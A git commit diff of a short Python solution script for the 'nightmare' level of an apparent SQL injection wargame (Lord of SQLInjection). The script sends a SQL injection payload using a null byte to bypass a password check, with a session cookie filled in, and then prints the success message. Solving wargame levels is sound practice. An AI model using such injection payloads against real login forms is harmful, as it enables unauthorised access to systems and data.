49f16b9b97b6e205eb5fbf9fd7c89e6172448c6c
thisisyoobi <75841024+thisisyoobi@users.noreply.github.com>
2023-12-09 02:32:04 +0900

    Update ex.py

--- LOS/nightmare/ex.py
+++ LOS/nightmare/ex.py
@@ -1,11 +1,13 @@
 import requests
 
-header = {"Cookie": "PHPSESSID=;"}
+header = {"Cookie": "PHPSESSID=i4gqs1fgn7ivdnmo77fh46j5ee;"}
 url = "https://los.rubiya.kr/chall/nightmare_be1285a95aa20e8fa154cb977c37fee5.php"
 
 payload = "?pw=')=0;%00"
 
-res = requests.get(url + payload, headers=header)
+response = requests.get(url + payload, headers=header)
 
-if "Clear!" in res.text:
-    print("Clear!")
+result = response.text
+if result.find("Clear!") != -1:
+    end = result.split("Clear!")[0].split("<h2>")[1]
+    print(end+"Clear!")
